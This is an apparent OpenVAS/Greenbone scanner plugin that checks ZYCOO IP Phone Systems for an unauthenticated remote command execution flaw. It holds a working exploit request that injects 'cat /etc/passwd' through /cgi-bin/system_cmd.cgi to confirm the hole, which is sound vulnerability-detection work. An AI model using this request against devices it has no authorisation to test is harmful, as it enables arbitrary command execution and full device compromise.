CPE = "cpe:/a:zycoo:ip_phone_system";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106214" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-08-29 16:16:40 +0700 (Mon, 29 Aug 2016)" );
	script_tag( name: "cvss_base", value: "9.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:N" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "ZYCOO IP Phone System Remote Code Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_zycoo_ip_phone_system_detect.sc" );
	script_mandatory_keys( "zycoo_ipphonesystem/detected" );
	script_tag( name: "summary", value: "ZYCOO IP Phone System is prone to a remote command execution vulnerability" );
	script_tag( name: "insight", value: "The script /cgi-bin/system_cmd.cgi doesn't validate input which leads
  to remote command execution." );
	script_tag( name: "impact", value: "An unauthenticated attacker can execute arbitrary OS commands which may
  lead to a complete compromise of the device." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/40269/" );
	script_tag( name: "vuldetect", value: "Tries to retrieve /etc/passwd." );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/cgi-bin/system_cmd.cgi?cmd='cat%20/" + file + "'";
	if(http_vuln_check( port: port, url: url, pattern: pattern, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

